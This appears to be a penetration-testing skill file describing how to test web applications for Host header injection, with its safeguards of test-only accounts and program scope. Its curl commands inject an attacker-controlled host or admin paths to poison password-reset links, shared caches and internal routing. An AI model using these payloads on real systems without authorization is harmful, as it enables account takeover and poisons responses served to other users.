---
name: attack-host-header
description: "Test Host and forwarded-host trust for reset-link poisoning, routing confusion, and cache impact"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - host-header
  - web
  - injection
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-644
chains_with:
  - attack-cache-poison
  - attack-open-redirect
prerequisites: []
severity_boost:
  attack-cache-poison: "Host header + cache poisoning = stored attack affecting all users"
---

# Host Header Injection

## Objective

Exploit web server reliance on the Host header to poison password reset links, web caches, or route requests to internal services.

## Testing Methodology

### Phase 1: Password Reset Poisoning

```bash
# Trigger password reset with injected Host
curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@example.com"

# X-Forwarded-Host variant
curl --max-time 15 --connect-timeout 5 -X POST https://TARGET/forgot-password \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@example.com"
```

If the reset email link contains `attacker.com`, the token is leaked when victim clicks.

### Phase 2: Duplicate Host Headers

```bash
# Two Host headers
curl --max-time 15 --connect-timeout 5 https://TARGET/ \
  -H "Host: TARGET" \
  -H "Host: attacker.com"

# Host with port injection
curl --max-time 15 --connect-timeout 5 https://TARGET/ \
  -H "Host: TARGET:@attacker.com"
```

### Phase 3: X-Forwarded-Host / X-Host

```bash
curl --max-time 15 --connect-timeout 5 https://TARGET/ -H "X-Forwarded-Host: attacker.com"
curl --max-time 15 --connect-timeout 5 https://TARGET/ -H "X-Host: attacker.com"
curl --max-time 15 --connect-timeout 5 https://TARGET/ -H "X-Forwarded-Server: attacker.com"
curl --max-time 15 --connect-timeout 5 https://TARGET/ -H "X-Original-URL: /admin"
curl --max-time 15 --connect-timeout 5 https://TARGET/ -H "X-Rewrite-URL: /admin"
```

### Phase 4: Absolute URL Routing

```bash
# Absolute URL overrides Host header
curl --max-time 15 --connect-timeout 5 "https://TARGET/api" \
  -H "Host: internal-admin.TARGET"
```

### Phase 5: Web Cache Poisoning via Host

```bash
# If response is cached with injected host
curl --max-time 15 --connect-timeout 5 https://TARGET/ -H "X-Forwarded-Host: attacker.com" -H "X-Cache: miss"
# Subsequent requests from any user will get poisoned response
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Reset link uses an attacker-controlled host on an account you control | Severity depends on whether a real token can be captured and redeemed; not automatically Critical |
| Injected host is stored in a shared cache and served to clean clients with demonstrated impact | Severity depends on impact and blast radius |
| Host manipulation reaches an otherwise unauthorized internal route | Severity depends on access-control impact and data/action exposed |
| Host value is reflected but no executable or security-relevant impact is demonstrated | Usually informational/low; reflection alone is not a confirmed vulnerability |

## Evidence Requirements

- Request with injected Host header
- Response/email showing injected domain
- For cache poisoning: cached response serving injected content
- For password reset: full reset URL with attacker domain

## Verification and False Positives

- Use only a test account and an email address you control for password-reset flows. Do not send reset requests for real users or attempt to redeem another person's token.
- Distinguish the HTTP `Host` header from proxy headers such as `X-Forwarded-Host`; record which value the application actually trusts.
- A reflected attacker-controlled hostname is only a signal. Confirm a security-relevant consequence such as a generated reset URL on your test account, an authorization boundary crossed, or a poisoned shared-cache response.
- For reset-link poisoning, a successful request or a generic “email sent” response does not prove that the delivered link uses the injected hostname. Verify the message delivered to your own test inbox.
- For routing bypass, compare the same endpoint with the canonical host and the manipulated host. A different status code alone is not proof of unauthorized access; inspect the response and authorization behavior.
- For cache impact, use `attack-cache-poison` as the companion skill and prove that a clean request receives the altered response without the injected header.
- Do not treat duplicate Host-header parsing differences as exploitable unless the proxy/origin behavior and impact are reproducible within the program's rules.
## References

- [PortSwigger: Host Header Attacks](https://portswigger.net/web-security/host-header)
- [OWASP: Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
